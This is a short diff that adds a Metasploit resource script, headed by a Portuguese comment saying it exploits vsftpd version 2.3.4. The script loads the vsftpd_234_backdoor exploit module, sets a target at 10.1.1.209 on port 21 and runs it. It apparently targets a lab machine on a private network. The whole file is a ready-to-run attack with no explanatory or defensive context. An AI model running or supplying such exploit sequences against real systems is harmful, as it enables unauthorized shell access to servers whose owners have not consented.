@@ -1,0 +1,6 @@
+# Explora vulnerabilidade da versão 2.3.4 do vsftpd
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 10.1.1.209
+set RPORT 21
+run
